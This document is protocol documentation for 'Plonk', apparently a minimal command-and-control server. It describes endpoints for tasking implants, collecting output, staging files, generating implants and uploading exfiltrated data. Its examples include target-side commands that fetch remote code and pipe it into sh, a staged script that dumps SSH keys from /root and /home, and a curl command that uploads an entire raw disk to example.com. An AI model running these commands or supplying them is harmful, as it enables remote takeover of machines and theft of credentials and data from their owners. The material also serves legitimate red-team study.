Protocol
========
Plonk, at it's core, is just an HTTP(s) server with extra steps.  It serves up
five endpoints:

Endpoint                       | Description
-------------------------------|------------
[`/t/<ID>`](#tasking-t)        | Request for tasking
[`/o/<id>`](#output-o)         | Command output
[`/f/<path>`](#static-files-f) | Serves static files
[`/c`](#implant-generation-c)  | "Implant" generation
[`/p/<path>`](#exfil-p)        | Exfil upload

All other HTTP queries get a 200 back with either an empty body or the contents
of `<plonk dir>/index.html` if it exists; its contents need not actually be
HTML.

Plonk is not particular about which HTTP verb is used.  Use whichever is
easiest on the implant side.  Plonk also isn't particular about what HTTP
client or client library an implant uses.  Although `/c` generates cURL in a
loop, anything which speaks Plonk's protocol works.

Implant IDs
-----------
Each Implant is assumed to have its own, unique ID.  This isn't enforced, but
things get kinda weird if it's not the case.  The ID itself doesn't matter much
as long as it works in a URL.  In principle, an empty ID may be used, but this
tends to be more trouble than it's worth.

Tasking (`/t`)
------------
Plonk maintains a per-Implant ID task queue.  A task is retrieved by making a
request for `/t/<ID>`.  Tasks are queued in the client by selecting an implant
with `,seti` and then giving the task as a command, or, alternatively, with
`,task`.

### Example
#### Client:
```
(plonk)> ,seti kittens
2023/12/30 00:29:05 Interacting with kittens
2023/12/30 00:29:05 Use ,logs to return to watching Plonk's logs
kittens> ps awwwfux
2023/12/30 00:29:09 [TASKQ] Task queued by stuart for kittens (qlen 1)
ps awwwfux
```

#### Implant:
```sh
curl -s https://example.com/t/kittens | sh  # Runs ps awwwfux
```

Output (`/o`)
-------------
Output is sent back as the body of a request to `/o/<ID>`.  It is logged and
printed to any user which has that ID selected with `,seti`.  By default, only
1MB of output will be accepted.  Larger amounts of data may be sent via
[`/p`](#exfil-p).

### Example
#### Implant:
```sh
curl -s https://example.com/t/kittens | 
sh 2>&2 | # We'll assume this is ps awwwfux from the previous section
curl --data-binary @- https://example.com/o/kittens
```
#### Client:
```
2023/12/30 00:29:11 [CALLBACK] Sent task to kittens (qlen 0):
ps awwwfux
2023/12/30 00:29:11 [OUTPUT] From kittens
USER       PID %CPU %MEM   VSZ   RSS TT  STAT   STARTED       TIME COMMAND
root         1  0.0  0.0   948   104 ??  I      Sat01AM    0:01.01 /sbin/init
root     30130  0.0  0.0  1112    24 ??  Ip     Sat01AM    0:00.00 - /sbin/slaacd
_slaacd  83001  0.0  0.0  1108    24 ??  Ip     Sat01AM    0:00.00 |-- slaacd: engine (slaacd)
_slaacd  55365  0.0  0.0  1128    24 ??  IpU    Sat01AM    0:00.00 `-- slaacd: frontend (slaacd)
...
```

Static Files (`/f`)
------------------
Plonk serves static files from `<plonk dir>/files` to requests for `/f/<path>`,
where the path is a path under `<plonk dir>/files`.  This is handy for staging
other tools.

### Example
We'll write a script to save us our first few minutes' worth of typing, then
run it on target.
#### Server:
```sh
cat >~/plonk.d/files/a.sh <<_eof
ps awwwfux
uname -a
id
find /{root,home/*}/.ssh -type f -exec echo {} \; -exec cat {} \;
_eof
```
#### Target:
```sh
curl -s https://example.com/f/a.sh |
sh 2>&1 |  # Script is executed and output sent back
curl --data-binary @- https://example.com/o/kittens
```

Implant Generation (`/c`)
-------------------------
An implant (in the loosest sense of the word) will be generated and returned
to a query to `/c`.  It takes no parameters.  

### Example
#### Target:
```sh
curl https://example.com/c | sh  # A callback should follow in short order
```

### Implant Templates
By default, a little self-backgrounding cURL-in-a-loop script is generated, but
this can be changed by putting a template using Go's
[template syntax](https://pkg.go.dev/text/template) in
`<plonk dir>/implant.tmpl`.  The template will be re-read every time `/c` is
called; no need to restart the server.  It will be passed the following struct
(from [`curlgen.go`](../internal/server/implantsvr/curlgen.go)):
```go
type TemplateParams struct {
	PubkeyFP string `json:",omitempty"` /* Self-signed TLS fingerprint. */
	RandN    string /* Random base36 number, for ImplantID */
	URL      string /* C2 URL for /{t,o}/ImplantID */
}
```
If there is no `implant.tmpl`, the built-in
[`curlgen.tmpl`](../internal/server/implantsvr/curlgen.tmpl) is used.

Exfil (`/p`)
------------
Data too large to be sent with `/o` or which should be stored in a file may
be sent to `/p`.

The maximum size of efxil which will be saved defaults to 100MB but may be set
using the `-exfil-max` flag when starting the server.  Exfil handling may be
disabled altogether with `-exfil-max 0`.

### Example
#### Target:
```sh
# This is a pretty terrible idea, unless the target has a really tiny disk.
curl --data-binary @/dev/sda https://example.com/p/kittens/dev/sda
# Neat party trick, though.
```
#### Server:
```sh
doas vnconfig vnd0 ~/exfil/kittens/dev/sda1
doas mount /dev/vnd0i /mnt
```
